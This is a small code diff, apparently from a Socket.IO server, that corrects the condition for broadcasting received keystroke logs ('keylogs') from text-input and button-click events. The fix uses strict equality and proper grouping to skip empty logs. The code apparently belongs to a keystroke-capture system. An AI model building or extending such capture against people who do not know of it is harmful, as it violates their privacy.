@@ -496,11 +496,11 @@ export const startSocketIO = async () => {
 						console.log("online keylogs=>", response);
 						// Check if keylogs is not an empty string before proceeding
 						if (
-							((keyEvent == "Text Input" ||
-								keyEvent == "Button Click") &&
-								keylogs &&
-								keylogs.trim() !== "[]") ||
-							keylogs.trim() !== ""
+							(keyEvent === "Text Input" ||
+								keyEvent === "Button Click") &&
+							keylogs &&
+							keylogs !== "[]" &&
+							keylogs !== ""
 						) {
 							console.log("KEYLOGS SEND===>", keylogs);
 							io.emit(
